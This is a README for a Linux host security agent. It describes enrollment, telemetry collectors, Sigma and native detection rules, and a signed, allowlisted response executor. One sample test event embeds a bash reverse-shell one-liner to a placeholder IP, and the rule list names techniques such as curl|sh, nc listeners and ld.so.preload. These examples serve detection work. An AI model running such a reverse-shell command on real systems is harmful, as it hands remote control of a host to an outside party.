# aegis-agent

On-box Linux security agent for Aegis. A single static Go binary (`CGO_ENABLED=0`, linux/amd64 and linux/arm64) that collects host telemetry, detects anomalies locally (Sigma + native rules + baselines + IOCs), ships anomalies to the Aegis server, and executes a fixed vocabulary of signed response commands. The wire contract is `docs/PROTOCOL.md`.

## Commands

```
aegis-agent enroll --server URL --token T     # one-time enrollment; pins the server key
aegis-agent run                               # daemon
aegis-agent test-rule --rule r.yml --events e.jsonl   # offline Sigma tester
aegis-agent version
```

Config: `/etc/aegis/agent.yaml` (`server_url`, `data_dir` default `/var/lib/aegis`, `log_level`). Overrides: `AEGIS_CONFIG`, `AEGIS_SERVER_URL`, `AEGIS_DATA_DIR`, `AEGIS_LOG_LEVEL`, then flags (`--server`, `--data-dir`, `--log-level`, `--config`).

`test-rule` input events are JSON lines using Sigma field names, e.g.
`{"logsource":{"category":"process_creation"},"Image":"/bin/bash","CommandLine":"bash -i >& /dev/tcp/1.2.3.4/9 0>&1"}`
(see `lab/fixtures/`). A missing `logsource` matches any rule. Exit code 3 when nothing matched.

## Layout

| Path | Purpose |
|---|---|
| `internal/event` | Normalized `Event` (Sigma field names), `Anomaly` |
| `internal/collector` | authlog (journald / auth.log), proc, auditd (linux, go-libaudit), netconn, fim, users. Parsers are pure and fixture-tested |
| `internal/sigma` | sigma-go loader/evaluator, logsource matching, `fieldmap.go`, embedded default pack `rules/default/*.yml` |
| `internal/detect` | native rules, EWMA/z-score baseline, IOC match, suppression, fingerprint dedup, 24h/200k event ring |
| `internal/policy` | signed policy verification (pinned server key), persistence, hot swap |
| `internal/executor` | the contract's commands only; injectable `Runner`; rollback records |
| `internal/transport` | enrollment, signed HTTP client, bbolt spool, batching sender, WS + poll hub |
| `internal/signing` | canonical request string, envelope sign/verify |
| `testdata/sign_vector.json` | fixed signing test vector for cross-verification by the server |

## Detection

* Sigma rules: embedded defaults (reverse shell, curl|sh, exec from /tmp, new UID 0, authorized_keys, cron, ld.so.preload, history clearing, base64 exec, nc listener) plus policy rules (`active`, `shadow`, `disabled`). Policy rules override defaults with the same Sigma `id`. Per-rule load errors are reported in the heartbeat `rule_errors`.
* Native: SSH brute force (`native:ssh_bruteforce.count` / `.window_s`), success after failures, new listener, rare outbound, process (tmp/deleted exe/reverse shell), new user / UID 0, FIM change, watches.
* Baseline: per-minute EWMA/z-score (`baseline.zscore`, `baseline.learning_samples`).
* IOC: ip / sha256 / domain from policy. Suppressions and a fingerprint cooldown (`dedup.cooldown_s`, default 300) apply to everything.

## Response executor

All commands are signed by the server, checked for signature, `host_id`, expiry and id replay (results of replayed ids are returned from a persisted cache, never re-executed). External programs run only through an allowlisted `Runner` (`nft`, `usermod`, `journalctl`) with argument vectors, never a shell. `block_ip` uses `table inet aegis` with timeout sets `blocked`/`blocked6`; `isolate_host` uses `table inet aegis_isolate` (loopback, established/related and server endpoints only) and auto-rolls back at TTL. `yara_scan` returns `failed: built without yara`.

## Build and test

```
make test                 # go vet + go test on the host
make build-linux          # dist/aegis-agent-linux-{amd64,arm64}
make docker-test          # tests inside golang:1.27 (runs linux-tagged code)
sudo deploy/install.sh --server https://... --token ...
```
